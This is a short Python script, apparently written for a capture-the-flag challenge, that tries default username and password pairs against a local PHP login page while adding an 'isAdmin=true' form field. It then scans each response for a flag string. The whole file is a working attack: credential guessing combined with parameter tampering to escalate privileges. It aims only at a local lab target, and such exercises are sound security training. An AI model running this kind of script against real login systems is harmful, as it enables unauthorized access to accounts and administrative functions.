from http.client import HTTPConnection
import urllib.parse
import re

host = "127.0.0.1"
port = 32829
path = "/index.php"

credentials = [
    ("admin", "admin"),
    ("admin", "password"),
    ("bart", "bart"),
    ("homer", "homer"),
]

print("[*] Testing credentials with isAdmin=true using HTTPConnection\n")

for username, password in credentials:
    print(f"[*] Testing: {username}:{password}")
    
    params = urllib.parse.urlencode({
        "username": username,
        "password": password,
        "isAdmin": "true"
    })
    
    try:
        conn = HTTPConnection(host, port, timeout=10)
        headers = {"Content-type": "application/x-www-form-urlencoded"}
        
        conn.request("POST", path, params, headers)
        response = conn.getresponse()
        body = response.read().decode('utf-8')
        
        print(f"  Status: {response.status}")
        print(f"  Length: {len(body)} bytes")
        
        # Check for FLAG
        flag_match = re.search(r'FLAG\{[^}]+\}', body)
        if flag_match:
            print(f"  [!!!] FLAG FOUND: {flag_match.group(0)}")
            print(f"\n  Full response:\n{body}\n")
        elif len(body) != 1164:
            print(f"  Anomaly detected (length != 1164)")
            print(f"  Response:\n{body}\n")
        
        conn.close()
        
    except Exception as e:
        print(f"  Error: {e}\n")

print("[*] Complete")

